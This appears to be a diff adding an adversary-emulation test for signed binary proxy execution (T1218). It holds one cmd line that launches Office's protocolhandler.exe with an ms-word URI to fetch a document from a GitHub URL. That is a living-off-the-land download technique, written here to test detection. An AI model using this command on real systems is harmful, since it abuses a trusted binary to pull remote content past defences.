@@ -1,0 +1,12 @@
+#TechniqueName: Signed Binary Proxy Execution
+#AtomicTestName: ProtocolHandler.exe Downloaded a Suspicious File
+#Description: Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.&
+#Language: cmd
+
+#get_prereq_commands
+write-host "Install Microsoft Word or provide correct path."
+
+
+#commands
+"C:\Program Files\Microsoft Office\Office16\protocolhandler.exe" "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+
